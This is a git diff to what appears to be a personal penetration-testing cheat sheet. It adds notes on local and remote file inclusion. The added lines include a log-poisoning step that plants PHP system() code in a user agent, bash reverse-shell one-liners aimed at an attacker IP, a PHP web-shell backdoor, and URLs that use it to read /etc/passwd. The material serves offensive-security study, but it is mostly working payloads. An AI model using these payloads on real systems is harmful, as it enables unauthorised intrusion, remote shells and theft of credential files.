@@ -1,3 +1,5 @@
+### Disclaimer - This page is meant as a personal reference page; there exist better places on the internet to learn penetration testing concepts and commands. 
+
 # Preliminary Scanning 
 ## nmap
 -   Basic scan - Nmap $IP
@@ -41,8 +43,39 @@ On Linux, we can use the /etc/passwd file to test directory traversal vulnerabil
 ## SQLi
 
 ## LFI
+- Executing a file on the server, though we may have to modify it first somehow.  
+- Ex: if the server stores access logs, modify the access log such that it contains our code, perhaps in the user agent field.
+	1. Change this: "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101
+Firefox/91.0"
+	2. To this: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
+	3. Then change the request to include "cmd=ls" to test
+	4. \<server>/file.php?page=. . / . ./log&cmd=ls 
+	- Note that it may need to be URL encoded if your command contains spaces i.e. ls&20-la for "ls -la"
+	5. Then one liner shell:
+		- bash -c "bash -i >& /dev/tcp/\<kali IP>/\<kali port> 0>&1"
+		- URL encoded though
+	- On a Windows target running XAMPP, the Apache logs can be found in C:\xampp\apache\logs\.
+	- On a Linux target Apache’s access.log file can be found in the /var/log/apache2/ directory.
+- There are other examples of LFI, including uploading a reverse shell to a web application and calling it through the URL. The above is just one example of the concept. 
 
 ## RFI
+- Executing on our file on the server. 
+- In PHP web applications, the allow_url_include option needs to be enabled to leverage RFI. This is rare and disabled by default in current versions of PHP
+	- [Example backdoor script](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/php/simple-backdoor.php):
+    <?php
+
+	    if(isset($_REQUEST['cmd'])){
+	            echo "<pre>";
+	            $cmd = ($_REQUEST['cmd']);
+	            system($cmd);
+	            echo "</pre>";
+	            die;
+	    }
+	    ?>
+	- Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
+	- curl"\<target>/index.php?page=http://\<kali server>/backdoor.php&cmd=ls"
+
+
 
 # SQL
 ## mysql
@@ -233,6 +266,12 @@ scp -P \<ssh port> \<file to copy> user@\<destination IP>:\<destination folder>
 	    
 	    exec("/bin/bash -c 'bash -i >& /dev/tcp/<kali_IP>/<kali_port> 0>&1'");
 	    ?>
+
+
+
+
+
+
 
 
 
